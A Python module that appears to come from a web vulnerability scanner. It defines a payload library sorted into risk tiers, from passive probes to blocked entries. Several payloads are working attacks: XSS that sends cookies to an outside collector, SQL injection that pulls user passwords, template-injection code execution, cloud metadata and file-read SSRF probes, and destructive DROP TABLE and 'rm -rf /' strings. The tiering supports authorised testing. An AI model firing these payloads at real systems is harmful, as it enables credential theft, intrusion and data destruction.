"""
Safe Payload Library — BLACKMIRROR-X GLASSWING
Tiered payload system ensuring destructive payloads never auto-execute.

Tiers:
  PASSIVE    — observation only, no data modification
  LOW_RISK   — safe probes, standard recon
  MANUAL_REVIEW — requires user confirmation
  LAB_ONLY   — only in isolated test environments
  BLOCKED    — permanently disabled, never run

All HIGH_RISK or destructive payloads are either BLOCKED or require explicit approval.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional


class PayloadTier(str, Enum):
    PASSIVE = "passive"
    LOW_RISK = "low_risk"
    MANUAL_REVIEW = "manual_review"
    LAB_ONLY = "lab_only"
    BLOCKED = "blocked"


@dataclass
class Payload:
    """A single payload with metadata."""
    value: str
    vuln_type: str
    tier: PayloadTier
    context: str = ""          # html, js, attr, url, json, header, sql, etc.
    description: str = ""
    expected_indicator: str = "" # what to look for in response
    detection_regex: str = ""    # regex pattern for automated detection
    waf_evasions: list[str] = field(default_factory=list)
    cwe_reference: str = ""
    source: str = "bmx_library"

    def is_safe_for_auto(self) -> bool:
        """Whether this payload can run without manual approval."""
        return self.tier in (PayloadTier.PASSIVE, PayloadTier.LOW_RISK)

    def to_dict(self) -> dict[str, Any]:
        return {
            "value": self.value,
            "vuln_type": self.vuln_type,
            "tier": self.tier.value,
            "context": self.context,
            "description": self.description,
            "expected_indicator": self.expected_indicator,
            "detection_regex": self.detection_regex,
            "waf_evasions": self.waf_evasions,
            "cwe_reference": self.cwe_reference,
        }


# ─── Payload Collections ──────────────────────────────────────────────────────

PAYLOAD_LIBRARY: dict[str, list[Payload]] = {
    "xss": [
        # PASSIVE — canary/polyglot probes that won't execute in modern browsers
        Payload("bmx_xss_probe", "xss", PayloadTier.PASSIVE,
                context="all", description="Unique canary string for reflection detection",
                expected_indicator="bmx_xss_probe"),
        # LOW_RISK — safe alert-based probes
        Payload("<script>alert('bmxXSS1')</script>", "xss", PayloadTier.LOW_RISK,
                context="html_text", description="Basic script injection",
                expected_indicator="bmxXSS1",
                detection_regex=r"bmxXSS1",
                cwe_reference="CWE-79"),
        Payload("<img src=x onerror=\"alert('bmxXSS2')\">", "xss", PayloadTier.LOW_RISK,
                context="html_attr", description="IMG onerror XSS",
                expected_indicator="bmxXSS2"),
        Payload("'\"><script>alert('bmxXSS3')</script>", "xss", PayloadTier.LOW_RISK,
                context="html_attr", description="Attribute escape + script",
                expected_indicator="bmxXSS3"),
        Payload("<svg onload=\"alert('bmxXSS4')\">", "xss", PayloadTier.LOW_RISK,
                context="html_text", description="SVG onload XSS",
                expected_indicator="bmxXSS4"),
        Payload("javascript:alert('bmxXSS5')", "xss", PayloadTier.LOW_RISK,
                context="url_param", description="Protocol handler XSS"),
        # MANUAL_REVIEW — stored/DOM XSS probes
        Payload("<script>fetch('https://bmxcollect.io/?c='+document.cookie)</script>", "xss",
                PayloadTier.MANUAL_REVIEW, context="stored",
                description="Cookie exfil XSS — requires manual approval"),
        # LAB_ONLY — advanced payloads
        Payload("<script>window.opener.location='https://evil.com'</script>", "xss",
                PayloadTier.LAB_ONLY, description="Tabnabbing via window.opener"),
    ],

    "sqli": [
        # PASSIVE — syntax error probes (very safe)
        Payload("'", "sqli", PayloadTier.PASSIVE, context="string",
                description="Single quote error probe", expected_indicator="syntax error"),
        Payload("''", "sqli", PayloadTier.PASSIVE, context="string",
                description="Double quote escape probe"),
        Payload("\\", "sqli", PayloadTier.PASSIVE, context="string",
                description="Backslash probe"),
        # LOW_RISK — boolean-based probes
        Payload("' AND '1'='1", "sqli", PayloadTier.LOW_RISK, context="string",
                description="Boolean true injection", cwe_reference="CWE-89"),
        Payload("' AND '1'='2", "sqli", PayloadTier.LOW_RISK, context="string",
                description="Boolean false injection"),
        Payload("1 AND 1=1", "sqli", PayloadTier.LOW_RISK, context="integer",
                description="Integer boolean probe"),
        # MANUAL_REVIEW — union-based extraction (requires oversight)
        Payload("' UNION SELECT NULL,NULL,NULL--", "sqli", PayloadTier.MANUAL_REVIEW,
                description="UNION column count probe — requires approval"),
        Payload("' UNION SELECT NULL,username,password FROM users--", "sqli",
                PayloadTier.MANUAL_REVIEW, description="UNION data extraction — requires approval"),
        # LAB_ONLY — time-based (can cause performance impact)
        Payload("' AND SLEEP(2)--", "sqli", PayloadTier.LAB_ONLY,
                context="mysql", description="MySQL time-based blind — lab only"),
        Payload("'; WAITFOR DELAY '0:0:2'--", "sqli", PayloadTier.LAB_ONLY,
                context="mssql", description="MSSQL time-based — lab only"),
        # BLOCKED — destructive operations
        Payload("'; DROP TABLE users--", "sqli", PayloadTier.BLOCKED,
                description="PERMANENTLY BLOCKED: table deletion"),
        Payload("'; DELETE FROM users--", "sqli", PayloadTier.BLOCKED,
                description="PERMANENTLY BLOCKED: data deletion"),
    ],

    "ssrf": [
        # PASSIVE — check if URL parameter exists
        Payload("https://bmx-canary-check.internal/", "ssrf", PayloadTier.PASSIVE,
                description="Canary domain SSRF probe"),
        # LOW_RISK — safe external domains
        Payload("http://169.254.169.254/", "ssrf", PayloadTier.LOW_RISK,
                description="AWS metadata endpoint probe", expected_indicator="ami-id"),
        Payload("http://metadata.google.internal/computeMetadata/v1/", "ssrf",
                PayloadTier.LOW_RISK, description="GCP metadata probe"),
        Payload("http://169.254.169.254/latest/meta-data/", "ssrf", PayloadTier.LOW_RISK,
                description="AWS metadata data probe", cwe_reference="CWE-918"),
        # MANUAL_REVIEW — internal network probing
        Payload("http://localhost/", "ssrf", PayloadTier.MANUAL_REVIEW,
                description="Localhost probe — requires approval"),
        Payload("http://192.168.1.1/", "ssrf", PayloadTier.MANUAL_REVIEW,
                description="RFC1918 internal probe — requires approval"),
        # LAB_ONLY — file protocol
        Payload("file:///etc/passwd", "ssrf", PayloadTier.LAB_ONLY,
                description="File read probe — lab only"),
    ],

    "ssti": [
        # LOW_RISK — math probes (harmless evaluation)
        Payload("{{7*7}}", "ssti", PayloadTier.LOW_RISK, context="jinja2",
                description="Jinja2/Twig math probe", expected_indicator="49",
                detection_regex=r"49", cwe_reference="CWE-94"),
        Payload("${7*7}", "ssti", PayloadTier.LOW_RISK, context="freemarker",
                description="FreeMarker/EL math probe", expected_indicator="49"),
        Payload("<%= 7*7 %>", "ssti", PayloadTier.LOW_RISK, context="erb",
                description="ERB math probe", expected_indicator="49"),
        Payload("#{7*7}", "ssti", PayloadTier.LOW_RISK, context="smarty",
                description="Ruby/Smarty math probe", expected_indicator="49"),
        # MANUAL_REVIEW — file read
        Payload("{{config.items()}}", "ssti", PayloadTier.MANUAL_REVIEW,
                description="Flask config dump — requires approval"),
        # LAB_ONLY — RCE probes
        Payload("{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}", 
                "ssti", PayloadTier.LAB_ONLY, description="Python SSTI RCE — lab only"),
        # BLOCKED — destructive
        Payload("{{''.__class__.__mro__[1].__subclasses__()[396]('rm -rf /',shell=True)}}", 
                "ssti", PayloadTier.BLOCKED, description="PERMANENTLY BLOCKED: file deletion"),
    ],

    "idor": [
        # LOW_RISK — parameter manipulation probes
        Payload("1337", "idor", PayloadTier.LOW_RISK, context="integer_id",
                description="Try common test ID value", cwe_reference="CWE-639"),
        Payload("0", "idor", PayloadTier.LOW_RISK, context="integer_id",
                description="Zero ID probe"),
        Payload("../1", "idor", PayloadTier.LOW_RISK, context="path",
                description="Path traversal to different resource"),
        # MANUAL_REVIEW — accessing other users' data
        Payload("{target_user_id}", "idor", PayloadTier.MANUAL_REVIEW,
                description="Replace ID with known other user ID — requires approval"),
    ],

    "cors": [
        # PASSIVE — reflection check
        Payload("bmx-cors-test.evil.com", "cors", PayloadTier.PASSIVE,
                context="origin_header", description="Malicious origin reflection check",
                expected_indicator="bmx-cors-test.evil.com"),
        Payload("null", "cors", PayloadTier.PASSIVE,
                context="origin_header", description="Null origin check"),
        Payload("https://evil.com", "cors", PayloadTier.LOW_RISK,
                context="origin_header", description="External origin test"),
    ],

    "open_redirect": [
        # LOW_RISK — safe external redirect probes
        Payload("//google.com", "open_redirect", PayloadTier.LOW_RISK,
                description="Protocol-relative redirect probe", cwe_reference="CWE-601"),
        Payload("https://google.com", "open_redirect", PayloadTier.LOW_RISK,
                description="Absolute URL redirect probe"),
        Payload("///google.com", "open_redirect", PayloadTier.LOW_RISK,
                description="Triple-slash redirect bypass"),
        Payload("////google.com", "open_redirect", PayloadTier.LOW_RISK,
                description="Quad-slash redirect bypass"),
    ],
}


def get_payloads(
    vuln_type: str,
    max_tier: PayloadTier = PayloadTier.LOW_RISK,
    context: str = "",
    limit: int = 20,
) -> list[Payload]:
    """
    Get payloads for a vulnerability type up to a maximum risk tier.
    Payloads above max_tier are filtered out.
    """
    tier_order = [
        PayloadTier.PASSIVE,
        PayloadTier.LOW_RISK,
        PayloadTier.MANUAL_REVIEW,
        PayloadTier.LAB_ONLY,
        PayloadTier.BLOCKED,
    ]
    max_tier_idx = tier_order.index(max_tier)

    all_payloads = PAYLOAD_LIBRARY.get(vuln_type, [])
    filtered = [
        p for p in all_payloads
        if tier_order.index(p.tier) <= max_tier_idx
        and (not context or not p.context or p.context == context or p.context == "all")
    ]

    return filtered[:limit]


def get_auto_safe_payloads(vuln_type: str, context: str = "", limit: int = 10) -> list[Payload]:
    """Get only payloads safe for automatic execution (passive + low_risk)."""
    return get_payloads(vuln_type, max_tier=PayloadTier.LOW_RISK, context=context, limit=limit)


def get_all_for_manual(vuln_type: str) -> list[Payload]:
    """Get all payloads including manual_review tier for human-supervised testing."""
    return get_payloads(vuln_type, max_tier=PayloadTier.MANUAL_REVIEW)


def get_payload_tiers_summary() -> dict[str, dict]:
    """Get summary of payload library by type and tier."""
    summary = {}
    for vtype, payloads in PAYLOAD_LIBRARY.items():
        tier_counts: dict[str, int] = {}
        for p in payloads:
            tier_counts[p.tier.value] = tier_counts.get(p.tier.value, 0) + 1
        summary[vtype] = {
            "total": len(payloads),
            "tiers": tier_counts,
            "auto_safe": sum(1 for p in payloads if p.is_safe_for_auto()),
        }
    return summary
